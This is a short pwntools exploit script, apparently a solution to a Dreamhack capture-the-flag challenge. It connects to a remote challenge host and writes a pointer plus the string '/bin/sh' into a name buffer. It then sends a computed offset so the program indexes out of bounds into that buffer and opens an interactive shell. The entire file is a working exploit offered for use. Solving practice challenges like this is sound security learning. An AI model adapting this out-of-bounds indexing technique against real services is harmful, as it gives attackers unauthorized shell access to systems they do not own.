from pwn import *

p = remote("host8.dreamhack.games",10593)

context.log_level="debug"

name = 0x0804a0ac
command = 0x804a060

offset = (name - command) / 4

payload = p32(name + 4)
payload += b"/bin/sh\x00"

# 4. 데이터 전송
p.sendlineafter(b"Admin name: ", payload)
p.sendlineafter(b"What do you want?: ", str(offset).encode())
p.interactive()